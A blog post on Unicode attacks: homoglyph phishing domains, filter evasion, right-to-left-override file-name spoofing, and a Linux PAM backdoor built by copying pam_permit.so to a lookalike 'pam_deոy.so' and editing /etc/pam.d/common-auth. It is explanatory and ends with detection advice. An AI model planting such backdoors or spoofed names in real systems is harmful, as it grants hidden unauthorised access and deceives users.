---
title: "Hacking The Web With Unicode"
categories:
  - Hacking
---

Confuse, Spoof and Make Backdoors.

Unicode was developed to represent all of the world's languages on the computer.

Early in the history of computers, characters were encoded by assigning a number to each one. This encoding system was not adequate since it did not cover many languages besides English, and it was impossible to type the majority of languages in the world.

Then the Unicode standard emerged. The Unicode standard consists of a set of code charts for a visual reference of what the character looks like and a corresponding "code" for each unique character. See the chart above! And now, the world's languages can be typed and transmitted easily using the computer!

## Visual Spoofing

However, the adoption of Unicode has also introduced a whole host of attack vectors onto the Internet. And today, let's talk about some of these issues!

### Unicode phishing

One of the main issues is that some characters of different languages look identical or are very similar to each other.

```
A Α А ᗅ ᗋ ᴀ Ａ
```

These characters all look alike, but they all have a different encoding under the Unicode system. Therefore, they are all completely different as far as the computer is concerned.

Attackers can exploit this during a phishing attack because users put a lot of trust in domain names. When you see a trusted domain name, like "google.com" in your URL bar, you immediately trust the website that you are visiting.

Attackers can take advantage of this trust by registering a domain name that looks like the trusted one, for example, "goōgle.com". In this case, victims can easily overlook the additional marking on the "o", trust that they are indeed on Google's website, and provide the fraudulent site their Google credentials.

Spoofing domain names this way can also help attackers lure victims to their site. For example, attackers can post a link "images.goōgle.com/puppies" on a social media site. She gets her victims to think that the link redirects to a puppy photo on Google when it really redirects to a page that auto-downloads malware.

### Bypassing word filters

Unicode can also be used to bypass profanity filters. When an email list or forum uses profanity filters and prevents users from using profanities like "*sshole", the filter can be easily bypassed by using lookalike Unicode characters, like "*sshōle".

### Spoofing file extensions

Another interesting exploit utilizes the Unicode character (U+202E), which is the "right-to-left override" character. This character visually reverses the direction of the text that comes after the character.

For example, the string "harmless(U+202E)txt.exe" will appear on the screen as "harmlessexe.txt". This can cause users to believe that the file is a harmless text file, while they are actually downloading and opening an executable file.

## Unicode Backdoors

Just what else could be done using the visual spoofing capabilities of Unicode? Quite a lot, as it turns out! Unicode can also be used to hide backdoors in scripts. Let's look at how attackers can use Unicode to make their manipulations of files (nearly) undetectable!

There is a script in Linux systems that handles authentication: */etc/pam.d/common-auth*. And the file contains these lines:

```
[...]
auth    [success=1 default=ignore]  pam_unix.so nullok_secure
# here's the fallback if no module succeeds
auth    requisite           pam_deny.so
[...]
auth    required            pam_permit.so
[...]
```

The script first checks the user's password. Then if the password check fails, *pam_deny.so* is executed, making the authentication fail. Otherwise, *pam_permit.so* is executed, and the authentication will succeed.

So what can an attacker do if she gains temporary access to the system? First, she can copy the contents of *pam_permit.so* to a new file, "pam_deոy.so", whose filename looks like *pam_deny.so* visually.

```bash
cp /lib/*/security/pam_permit.so /lib/security/pam_deոy.so
```

Then, she can modify */etc/pam.d/common-auth* to use the newly created "pam_deոy.so" should the password checking fail:

```
[...]
auth    [success=1 default=ignore]  pam_unix.so nullok_secure
# here's the fallback if no module succeeds
auth    requisite           pam_deոy.so
[...]\
auth    required            pam_permit.so
[...]
```

Now, authentication will succeed regardless of the result of the password check, since both "pam_permit.so" and "pam_deոy.so" contain the script that makes authentication succeed.

And since "n" and "ո" lookalike in many terminal fonts, */etc/pam.d/common-auth* will look very much like the original when viewed with cat, less or a text editor. Furthermore, the contents of the original *pam_deny.so* was not modified at all, and still contains the code that makes authentication fail.

This backdoor is therefore extremely difficult to detect even if the system administrator carefully inspects the contents of both */etc/pam.d/common-auth* and *pam_deny.so*.

## Tools

Here is a tool that you can use to test out some these Unicode attacks:

[Homoglyph Attack Generator](http://www.irongeek.com/homoglyph-attack-generator.php)

One way that you can protect yourself against Unicode attacks is to make sure that you scan any text string that looks suspect with a Unicode detector. For example, you can use these tools to detect Unicode:

[Unicode Character Detector](https://www.textmagic.com/free-tools/unicode-detector)

[Unicode Lookup](https://unicodelookup.com/)

## Conclusion

Unicode has introduced many new attack vectors onto the Internet. Fortunately, most websites and applications are now noticing the dangers that Unicode characters pose, and are taking action against these attacks!

Some applications prevent users from using certain character sets, while others display odd Unicode characters in the form of a question mark "�" or a block character "□".

Is your application protected against Unicode attacks?